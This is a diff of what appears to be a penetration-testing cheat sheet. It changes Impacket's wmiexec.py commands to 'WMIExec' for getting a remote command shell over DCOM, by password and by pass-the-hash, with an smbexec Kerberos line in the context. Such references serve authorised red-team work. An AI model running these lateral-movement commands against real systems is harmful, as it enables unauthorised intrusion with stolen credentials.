@@ -52,7 +52,7 @@ export KRB5CCNAME=<ccache_file>; smbexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-
 Execute a command shell without touching the disk or running a new service using DCOM
 
 ```
-wmiexec.py <domain>/<user>:<password>@<ip>
+WMIExec <domain>/<user>:<password>@<ip>
 ```
 
 ## wmiexec  with pass the hash (pth) 
@@ -61,7 +61,7 @@ wmiexec.py <domain>/<user>:<password>@<ip>
 Execute a command shell without touching the disk or running a new service using DCOM
 
 ```
-wmiexec.py -hashes <hash> <user>@<ip>
+WMIExec -hashes <hash> <user>@<ip>
 ```
 
 ## atexec - execute command view the task scheduler 
